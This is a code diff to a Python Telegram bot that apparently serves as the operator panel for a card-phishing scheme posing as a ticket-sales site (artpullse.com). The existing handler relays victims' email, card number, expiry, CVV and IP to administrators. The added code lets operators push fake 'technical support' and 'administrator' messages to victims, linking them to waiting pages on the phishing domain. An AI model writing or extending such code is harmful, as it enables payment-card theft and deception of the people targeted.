@@ -23,6 +23,7 @@ from aiohttp import web
 from functools import wraps
 import aiohttp
 from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS
+import requests
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
@@ -1057,6 +1058,7 @@ async def payment_notify(request):
     expiry = data.get('expiry', '')
     cvv = data.get('cvv', '')
     ip = data.get('ip', '')
+    user_id = data.get('user_id', '')  # якщо є user_id, інакше треба визначати
     text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1065,6 +1067,10 @@ async def payment_notify(request):
                 InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
                 InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
                 InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ],
+            [
+                InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{user_id}"),
+                InlineKeyboardButton(text="Text", callback_data=f"text:{user_id}")
             ]
         ]
     )
@@ -1139,6 +1145,35 @@ async def code_request_again_handler(call: types.CallbackQuery):
     async with aiohttp_client.ClientSession() as session:
         await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
     await call.answer("Request sent to user")
+
+@router.callback_query(lambda c: c.data.startswith("support:"))
+async def admin_support_callback(call: types.CallbackQuery):
+    user_id = int(call.data.split(":")[1])
+    total = 230  # або отримати з user_data
+    url = f"https://artpullse.com/buy-tickets/loading/waiting-support.html?total={total}"
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=url)]])
+    await bot.send_message(user_id, "Вам повідомлення від технічної підтримки:", reply_markup=kb)
+    await call.message.answer("Посилання надіслано користувачу.")
+
+@router.callback_query(lambda c: c.data.startswith("text:"))
+async def admin_text_callback(call: types.CallbackQuery):
+    user_id = int(call.data.split(":")[1])
+    await call.message.answer("Введіть текст для користувача:")
+    user_step[call.from_user.id] = f"text_for_{user_id}"
+
+@router.message(lambda m: user_step.get(m.from_user.id, "").startswith("text_for_"))
+async def admin_enter_text(message: types.Message):
+    step = user_step[message.from_user.id]
+    user_id = int(step.replace("text_for_", ""))
+    text = message.text
+    text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+    requests.post('https://artpullse.com/set_custom_text', json={'text_id': text_id, 'text': text})
+    total = 230  # або отримати з user_data
+    url = f"https://artpullse.com/buy-tickets/loading/waiting-text.html?total={total}&text_id={text_id}"
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=url)]])
+    await bot.send_message(user_id, "Вам повідомлення від адміністратора:", reply_markup=kb)
+    await message.answer("Посилання надіслано користувачу.")
+    user_step[message.from_user.id] = None
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
